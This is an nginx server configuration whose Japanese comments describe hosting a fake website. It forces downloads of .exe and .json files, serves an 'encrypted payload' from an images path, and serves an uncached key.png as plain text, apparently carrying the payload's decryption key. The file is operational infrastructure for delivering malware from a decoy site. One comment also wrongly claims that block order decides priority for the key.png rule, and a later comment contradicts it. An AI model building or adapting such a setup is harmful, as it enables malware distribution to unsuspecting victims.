worker_processes  1;

events {
    worker_connections  1024;
}

http {
    include       mime.types;
    default_type  text/html;

    sendfile        on;
    keepalive_timeout  65;

    server {
        listen       80;
        server_name  localhost;

        # 偽サイトのトップページ
        location / {
            root   html;
            index  index.html index.htm;
        }

        # ダウンロードさせるファイル群（.exeや.json用）
        location /assets/ {
            root   html;
            add_header Content-Disposition "attachment";
            add_header Content-Type "application/octet-stream";

            location ~* \.json$ {
                add_header Content-Disposition "attachment";
                add_header Content-Type "application/json";
            }
        }

        # 暗号化ペイロードは普通に配信
        location /images/ {
            root   html;
        }

        # ★超重要：key.png 専用の設定（一番最後に書くことで正規表現より優先させる）
        location = /assets/key.png {
            root   html;
            default_type text/plain;
            add_header Content-Type "text/plain; charset=utf-8";
            add_header Cache-Control "no-store, no-cache, must-revalidate"; # キャッシュを禁止する
        }

        # HTMLや画像は普通に表示（※これより上に key.png の設定を書く必要がある）
        location ~* \.(html|htm|css|js|png|jpg|jpeg|gif|ico|svg)$ {
            root   html;
        }

        # エラーページ
        error_page   500 502 503 504  /50x.html;
        location = /50x.html {
            root   html;
        }
    }
}
